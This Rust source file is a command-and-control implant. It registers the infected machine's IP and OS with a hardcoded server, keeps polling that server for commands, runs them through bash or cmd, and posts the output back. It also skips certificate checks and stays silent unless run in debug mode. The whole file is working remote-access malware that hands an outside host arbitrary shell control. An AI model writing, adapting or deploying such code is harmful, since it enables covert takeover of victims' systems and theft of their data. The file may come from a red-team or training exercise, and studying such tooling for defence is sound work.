//Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
//Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses

use std::{thread,time};
use std::process::{Command, Stdio};
use std::time::Duration;
use std::env::set_current_dir;
use std::path::Path;
use wait_timeout::ChildExt;
use std::io::Read;
use dirs;
use local_ip_address::local_ip;


const sleep_time: Duration = time::Duration::from_millis(5000);
const server_ip: &str = "https://129.21.49.57:443";

fn initHost(host_ip:&str) -> Option<String>{
    let ip = host_ip;
    let mut os = "";
    if cfg!(windows) {
        os = "Windows";
    } else if cfg!(unix) {
        os = "Linux";
    }
    let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let url = format!("{}/hosts/newHost",server_ip);
    let hostname = match client.post(url).json(&text).send(){
        Ok(ok)=>{
            let id = ok.text().unwrap().to_string(); 
            print(&id);
            Some(id)
        }, Err(e)=>{
            print(&"InitHost - Can't connect to server");
            print(&format!("{}", e));
            None
        }
    };
    return hostname;
}

fn get_local_ip() -> String {
    let local_ip = local_ip().unwrap(); //get the local IP
    let local_ip = format!("{}\n",local_ip); //format IP into string
    return local_ip;
}


fn getCommands(identifier:&str){
    let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
	let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
	let res = match client.post(commands_url).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Get_Commands - Can't connect to server");
            thread::sleep(sleep_time);
            return
        }
    };
    let res = format!(r#"{}"#,res);
    print(&res);
    //if the server response contains an error, restart the main loop
    let res = match json::parse(&res){
        Ok(ok)=>{
            ok
        }, Err(_)=>{
            print(&"Get_Commands - Can't parse JSON");
            thread::sleep(sleep_time);
            return
        }
    }; //always will receive json

    let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();
    if command_count == 69420{ //special number sent by server indicating there is an error
        main_loop(&get_id(&get_local_ip()));
    }
    let mut count = 1;
    if command_count == 0{
        print("no commands, sleeping");
        return
    }
    while count <= command_count{
        let cmd_id = format!("{}",res[format!("{}",count)]["cmd_id"]);
        let command = format!("{}",res[format!("{}",count)]["command"]);
        print("Command Received:");
        print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
        count+=1;
        handle_command(&cmd_id, &command, &identifier);
    }
}

fn handle_command(cmd_id:&str, command:&str, identifier: &str){
    //run command
    if command.len() > 2{
        if command.eq("checkIn"){
            post_response(&cmd_id,&"checkIn-pong", &identifier);
            print("checked in TODO");
            return;
        }
        if command[..=1].eq("cd") { //if the first two letters are cd
            let path = Path::new(&command[3..]); //the path is the remaining
            if &command[3..] == "~"{
                let home = dirs::home_dir().unwrap();
                set_current_dir(home);
            }
            else{
                set_current_dir(path);
            }
            let cmd_out = &run_command(&"pwd");
            post_response(&cmd_id, &cmd_out, &identifier);
        } else{
            let cmd_out = &run_command(&command);
            post_response(&cmd_id, &cmd_out, &identifier);
        }
    }else{
        let cmd_out = &run_command(&command);
        post_response(&cmd_id, &cmd_out, &identifier);
    }
}

fn run_command(cmd: &str) -> String {
    let child = if !cfg!(target_os ="windows"){
        let mut child = match Command::new("/bin/bash").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
            Ok(out)=>{
                out
            }
            Err(e)=>{
                return format!("");
            }
        };
        let three_sec = Duration::from_secs(3);
        let status_code = match child.wait_timeout(three_sec).unwrap() {
            Some(status) => status.code(),
            None => {
                match child.kill(){
                    Ok(_)=>{
                        "Process killed."
                    }
                    Err(_)=>{
                        "Process could not be killed."
                    }
                };
                child.wait().unwrap().code()
            }
        };
        child
    } else{
        Command::new("cmd").arg("/c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
    };
    let mut stdout_str = String::new();
    let mut stdout = child.stdout.unwrap();
    let mut stderr_str = String::new();
    let mut stderr = child.stderr.unwrap();
    stdout.read_to_string(&mut stdout_str);
    stderr.read_to_string(&mut stderr_str);
    let cmd_out = format!("{}{}",stderr_str,stdout_str);
    if cmd_out.ends_with('\n') { return cmd_out[0..cmd_out.len() - 1].to_string() }
    return cmd_out;
}

fn post_response(cmd_id: &str, response: &str, identifier: &str){
    let responses_url = format!("{}/hosts/{}/response",server_ip, identifier);
    let mut response = response;
    if (response.eq("")){
        response = "Command executed. (No response)"
    }
    print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
    let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let res = match client.post(&responses_url).json(&text).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Post_Response - Can't connect to server");
            return
        }
    };
    print("Successfully posted response to server.")
}

fn print(txt:&str){
    let mut print_bool: bool = false;
    if(std::env::args().any(|x| x == "--debug")){
        print_bool = true;
    }
    if print_bool{
        println!("{}",txt);
    }
}

fn get_id(host_ip:&str) -> String {
    loop{
        let identifier = match initHost(host_ip){
            Some(id)=>{
                id
            }, None=>{
                print(&"Get_id - Can't connect to server");
                thread::sleep(sleep_time);
                continue;
            }
        };
        return identifier;
    }
}

fn main_loop(identifier:&str) -> Result<String,String>{
    loop{
        getCommands(&identifier);
        thread::sleep(sleep_time);
    }
}

fn main(){
    let host_ip = get_local_ip();
    loop{
        let identifier = get_id(&host_ip);
        match main_loop(&identifier){
            Ok(_)=>{
                continue
            }, Err(_)=>{
                continue
            }
        }
    }
}
